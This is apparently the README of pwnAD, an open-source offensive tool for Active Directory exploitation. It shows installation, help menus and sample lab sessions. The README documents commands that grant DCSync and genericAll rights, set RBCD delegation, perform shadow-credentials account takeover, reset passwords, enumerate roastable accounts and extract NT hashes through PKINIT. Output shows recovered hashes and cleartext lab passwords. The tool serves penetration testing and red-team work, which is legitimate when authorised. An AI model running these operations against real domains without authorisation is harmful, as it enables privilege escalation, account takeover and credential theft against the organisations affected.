# pwnAD

[![MIT License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Status](https://img.shields.io/badge/Status-Active%20Development-yellow.svg)](https://github.com/LightxR/pwnAD)

pwnAD is a powerful tool for Active Directory exploitation, focusing primarily on LDAP and Kerberos protocols. Additional protocols and features are planned for future releases.

> **Note:** This tool is currently in active development. Some features may not be fully operational (when using certificate authentication, it's recommended to specify a username). Please open an issue or submit a pull request if you encounter any problems.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [LDAP Actions](#ldap-actions)
- [Special Modules](#special-modules)
- [Kerberos Actions](#kerberos-actions)

## Features

- **Multiple authentication methods** - Support for NTLM, Kerberos, and certificate-based authentication
- **LDAP enumeration and exploitation** - Extensive support for LDAP operations
- **Enhanced security support** - LDAP signing and channel binding for both simple and NTLM authentication via [ldap3-bleeding-edge](https://pypi.org/project/ldap3-bleeding-edge/)
- **Certificate-based attacks** - Kerberos actions (getTGT, getST, getNThash) supporting certificate authentication via PKINIT
- **Interactive shell** - User-friendly command-line interface with tab completion

### Supported Authentication Methods

#### LDAP Operations (get/add/remove/modify/query)

| Method | Flags | Comments |
|--------|-------|----------|
| NTLM (cleartext password) | `-p` | Falls back to simple authentication when failing |
| NTLM (hash) | `-H` | |
| Kerberos (cleartext password) | `-p` `-k` | |
| Kerberos (hash) | `-H` `-k` | |
| Kerberos (aeskey) | `--aes-key` | |
| Kerberos (ccache) | `-k` | Tries to load ccache from KRB5CCNAME env |
| Schannel (certificate) | `-pfx` | |
| Schannel (certificate) | `-cert` `-key` | |

#### Kerberos Operations (getTGT, getST, getNThash)

| Method | Flags | Comments |
|--------|-------|----------|
| Kerberos (cleartext password) | `-p` | |
| Kerberos (hash) | `-H` | |
| Kerberos (aeskey) | `--aes-key` | |
| Kerberos (ccache) | `-k` | For getST function only |
| Kerberos (certificate via PKINIT) | `-pfx` | |
| Kerberos (certificate via PKINIT) | `-cert` `-key` | |

## Installation

```bash
pipx install "git+https://github.com/LightxR/pwnAD"
```

## Usage

The tool uses actions as positional arguments:

- **LDAP actions**: add, remove, get, modify, query
- **Special modules**: shadow (more planned for the future)
- **Kerberos actions**: getTGT, getST, getNThash

### Basic Help

```bash
pwnAD -h
```

```
usage: pwnAD [-h] [--dc-ip ip address] [--kdcHost FQDN KDC] [-d DOMAIN] [-u USER] [--port PORT] [--tls]
             [-p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key] [-k] [-pfx PFX] [-pfx-pass pfx password] [-key key]
             [-cert cert] [--debug] [-i]
             {add,remove,get,modify,query,shadow,getTGT,getST,getNThash} ...

pwnAD commands

positional arguments:
  {add,remove,get,modify,query,shadow,getTGT,getST,getNThash}
                        Available actions
    add                 Perform ADD related actions
    remove              Perform REMOVE related actions
    get                 Perform GET related actions
    modify              Perform MODIFY related actions
    query               Perform QUERY related actions
    shadow              Perform shadow credentials related actions
    getTGT              Perform getTGT related actions
    getST               Perform getST related actions
    getNThash           Perform getNThash related actions

options:
  -h, --help            show this help message and exit
  --debug               Debug mode
  -i, --interactive     Spawning an interactive shell

Authentication & connection:
  --dc-ip ip address    IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted
                        it will use the domain part (FQDN) specified in the identity parameter
  --kdcHost FQDN KDC    FQDN of KDC for Kerberos.
  -d DOMAIN, --domain DOMAIN
                        (FQDN) domain to authenticate to
  -u USER, --user USER  user to authenticate with
  --port PORT           ldap port to authenticate on
  --tls                 Using TLS connection

  -p PASSWORD, --password PASSWORD
                        password to authenticate with
  -H [LMHASH:]NTHASH, --hashes [LMHASH:]NTHASH
                        NT/LM hashes, format is LMhash:NThash
  --aes-key hex key     AES key to use for Kerberos Authentication (128 or 256 bits)
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target
                        parameters. If valid credentials cannot be found, it will use the ones specified in the command
                        line

Certificate authentication:
  -pfx PFX              pfx/p12 file for certificate authentication
  -pfx-pass pfx password
                        password for pfx/p12 file
  -key key              .key file for certificate authentication
  -cert cert            .crt file for certificate authentication
```

## LDAP Actions

### add

Add various objects or permissions to Active Directory.

```bash
pwnAD [robco.corp\administrator]> add -h
usage: pwnAD add [-h] {user,computer,dcsync,genericAll,groupMember,write_gpo_dacl,RBCD} ...

positional arguments:
  {user,computer,dcsync,genericAll,groupMember,write_gpo_dacl,RBCD}
                        LDAP functions
    user                Add a user
    computer            Add a computer
    dcsync              Add DCSync rights to an object
    genericAll          Add genericAll rights to an object
    groupMember         Add a user/computer to a targeted group
    write_gpo_dacl      Give full control on a GPO for the specified user
    RBCD                Add Resource Based Constraint Delegation for service on target

options:
  -h, --help            show this help message and exit
```

### remove

Remove objects or permissions from Active Directory.

```bash
pwnAD [robco.corp\administrator]> remove -h
usage: pwnAD remove [-h] {computer,user,groupMember,dcsync,genericAll,RBCD} ...

positional arguments:
  {computer,user,groupMember,dcsync,genericAll,RBCD}
                        LDAP functions
    computer            Remove a computer
    user                Remove a user
    groupMember         Remove a user/computer from a targeted group
    dcsync              Remove DCSync rights from an object
    genericAll          Remove genericAll rights from an object
    RBCD                Remove msDS-AllowedToActOnBehalfOfOtherIdentity attribute

options:
  -h, --help            show this help message and exit
```

### get

Retrieve various objects or information from Active Directory.

```bash
pwnAD [robco.corp\administrator]> get -h
usage: pwnAD get [-h]
                 {user,users,members,membership,computers,DC,servers,CA,OU,containers,spn,constrained_delegation,unconstrained_delegation,RBCD,not_trusted_for_delegation,asreproastables,kerberoastables,password_not_required,groups,protected_users,users_description,passwords_dont_expire,users_with_admin_count,accounts_with_sid_histoy}
                 ...

positional arguments:
  {user,users,members,membership,computers,DC,servers,CA,OU,containers,spn,constrained_delegation,unconstrained_delegation,RBCD,not_trusted_for_delegation,asreproastables,kerberoastables,password_not_required,groups,protected_users,users_description,passwords_dont_expire,users_with_admin_count,accounts_with_sid_histoy}
                        LDAP functions
    user                Retreive user account information
    users               Retreive all domain users
    members             Retreive all members from a group
    membership          Retreive all groups membership for a specified account
    computers           Retreive computers
    DC                  Retreive domain controllers
    servers             Retreive servers
    CA                  Retreive Certificate Authority
    OU                  Retreive OU from the domain
    containers          Retreive containers from the domain
    spn                 Retreive all accounts with spn
    constrained_delegation
                        Retreive accounts with constrained delegation enabled
    unconstrained_delegation
                        Retreive accounts with unconstrained delegation enabled
    RBCD                Retreive accounts with RBCD enabled
    not_trusted_for_delegation
                        Retreive accounts not trusted for delegation
    asreproastables     Retreive asreproastables accounts
    kerberoastables     Retreive kerberoastable accounts
    password_not_required
                        Retreive accounts with PASSWD_NOTREQD set
    groups              Retreive user account information
    protected_users     Retreive all groups from domain
    users_description   Retreive all user accounts with description
    passwords_dont_expire
                        Retreive accounts with UserAccountControl set to DONT_EXPIRE_PASSWD
    users_with_admin_count
                        Retreive account with attribute adminaccount=1"
    accounts_with_sid_histoy
                        Retreive accounts with SID history

options:
  -h, --help            show this help message and exit
```

### modify

Modify various objects or attributes in Active Directory.

```bash
pwnAD [robco.corp\administrator]> modify -h
usage: pwnAD modify [-h] {password,owner,computer_name,dontreqpreauth,disable_account,enable_account} ...

positional arguments:
  {password,owner,computer_name,dontreqpreauth,disable_account,enable_account}
                        LDAP functions
    password            Modify a password for a specified account
    owner               Modify the owner of a specified object
    computer_name       Modify the name of the specified computer
    dontreqpreauth      Modify the userAccountControl to set UF_DONT_REQUIRE_PREAUTH to True or False
    disable_account     Disable the targeted account
    enable_account      Enable the targeted account

options:
  -h, --help            show this help message and exit
```

### query

Perform raw LDAP queries against Active Directory.

```bash
pwnAD [robco.corp\administrator]> query -h
usage: pwnAD query [-h] search_filter attributes

positional arguments:
  search_filter  Filter to be applied on LDAP query
  attributes     Attributes to be applied on LDAP query

options:
  -h, --help     show this help message and exit
```

## Special Modules

### shadow

An implementation of Certipy's shadow credentials attack.

```bash
pwnAD [robco.corp\administrator]> shadow -h
usage: pwnAD shadow [-h] {auto,add,list,clear,remove,info} ...

positional arguments:
  {auto,add,list,clear,remove,info}
                        Abuse Shadow Credentials for account takeover
    auto                Add a new Key Credential to the target account, authenticate with the Key Credential to
                        retrieve the NT hash and a TGT for the target, and finally restore the old Key Credential
                        attribute
    add                 Add Key Credentials to a target
    list                List all Key Credentials of a target
    clear               Clear all Key Credentials from a target
    remove              Remove Key Credentials from a supplied device ID
    info                Display Key Credentials information from a supplied device ID

options:
  -h, --help            show this help message and exit
```

## Kerberos Actions

### getTGT

Get a Kerberos Ticket Granting Ticket (TGT). Supports PKINIT for certificate authentication.

```bash
pwnAD [robco.corp\administrator]> getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache
```

### getST

Get a Kerberos Service Ticket (ST). Supports PKINIT for certificate authentication.

```bash
pwnAD [robco.corp\administrator]> getST -spn host/dc01
[*] Getting ST for user
[*] Saving ticket in administrator@host_dc01@ROBCO.CORP.ccache
```

### getNThash

Retrieve NT hash for a user using their certificate via PKINIT.

```bash
pwnAD [u:ROBCO\Administrator]> getNThash 
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for administrator
[*] Got NThash for administrator: 7c8beec53973ada7cc96009c5e68f5fc
```

## Interactive Mode

pwnAD includes a convenient interactive shell mode for streamlined operations. Use the `-i` or `--interactive` flag along with connection details to start the interactive mode.

```bash
pwnAD -i --dc-ip 192.168.100.5 -u administrator -p 'Veryprotected123!' --tls
```

```
 ____ ____ ____ ____ ____ 
|p ||w ||n ||A ||D |
|__||__||__||__||__|
|/__\|/__\|/__\|/__\|/__\|

Version 0.0.1 by @LightxR 


pwnAD [robco.corp\administrator]> 
```

Once started, you can type `help` or press tab to show the available actions:

```
pwnAD [robco.corp\administrator]> 
add           getNThash     getTGT        modify        rebind        shadow        switch_user   
get           getST         infos         query         remove        start_tls  
```

Autocompletion is available for all commands and subcommands:

```
pwnAD [robco.corp\administrator]> add 
add RBCD             add dcsync           add groupMember      add write_gpo_dacl   
add computer         add genericAll       add user  
```

### Interactive Mode Features

#### infos

Display current LDAP connection details.

```bash
pwnAD [robco.corp\administrator]> infos
[*] Target: 	192.168.99.10
[*] Port: 	389
[*] Domain: 	robco.corp
[*] User: 	administrator
[*] Password: 	Veryprotected123!
[*] LM_hash: 	None
[*] NT_hash: 	None
[*] aesKey: 	None
[*] pfx: 	None
[*] key: 	None
[*] cert: 	None
[*] kerberos: 	False
[*] TLS: 	False
```

#### start_tls

Initiate a TLS connection when connected on standard port 389.

```bash
pwnAD [robco.corp\administrator]> modify password lowpriv Veryprotected123!
[-] Server unwilling to perform the operation: LDAPUnwillingToPerformResult - 53 - unwillingToPerform - None - 0000001F: SvcErr: DSID-031A124C, problem 5003 (WILL_NOT_PERFORM), data 0
 - modifyResponse - None

pwnAD [robco.corp\administrator]> start_tls 
[*] Sending StartTLS command...
[*] StartTLS succeded, you are now connected through a TLS channel

pwnAD [robco.corp\administrator]> modify password lowpriv Veryprotected123!
[*] Successfully changed lowpriv password to: Veryprotected123!
```

#### rebind

Reconnect to the server if the connection times out.

```bash
pwnAD [robco.corp\administrator]> shadow list lowpriv
[-] An error has occured : socket sending error[Errno 104] Connection reset by peer

pwnAD [robco.corp\administrator]> rebind
[*] Successfully performed a connection rebind.

pwnAD [robco.corp\administrator]> shadow list lowpriv
[*] Targeting user lowpriv
[*] Listing Key Credentials for lowpriv
[*] DeviceID:1d8669ab-6a68-a58c-6b46-606e3623f579 | Creation Time (UTC): 2025-02-03 11:13:41.298149
```

#### switch_user

Change the user context without restarting the interactive shell.

```bash
pwnAD [robco.corp\administrator]> switch_user -u lowpriv -p Veryprotected123!
[*] Successfully switched user to lowpriv.

pwnAD [robco.corp\lowpriv]> infos
[*] Target: 	192.168.99.10
[*] Port: 	389
[*] Domain: 	robco.corp
[*] User: 	lowpriv
[*] Password: 	Veryprotected123!
[*] LM_hash: 	None
[*] NT_hash: 	None
[*] aesKey: 	None
[*] pfx: 	None
[*] key: 	None
[*] cert: 	None
[*] kerberos: 	False
[*] TLS: 	False
```

#### Execute OS Commands

Run operating system commands by prefixing with `!`:

```bash
pwnAD [robco.corp\administrator]> !ls
LICENSE	 pwnAD   README.md  setup.py  stimpack.recipe
```

This is useful for setting environment variables like `KRB5CCNAME` without exiting the interactive session.

## Credits

pwnAD is built on inspiration from the following tools and contributors:

- [ly4k](https://twitter.com/ly4k_) for [Certipy](https://github.com/ly4k/Certipy)
- [CravateRouge](https://cravaterouge.bsky.social) for [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [p0dalirius](https://twitter.com/podalirius_) and [Shutdown](https://twitter.com/_nwodtuhs) for [PyWhisker](https://github.com/ShutdownRepo/pywhisker), [rbcd.py](https://github.com/fortra/impacket/blob/master/examples/rbcd.py) and many other contributions
- [Dirk-jan](https://twitter.com/_dirkjan) for [PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [AlmondOffsec](https://offsec.almond.consulting) for [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)
- [Fortra](https://github.com/fortra) and all the [contributors](https://github.com/fortra/impacket/graphs/contributors) for [Impacket](https://github.com/fortra/impacket)
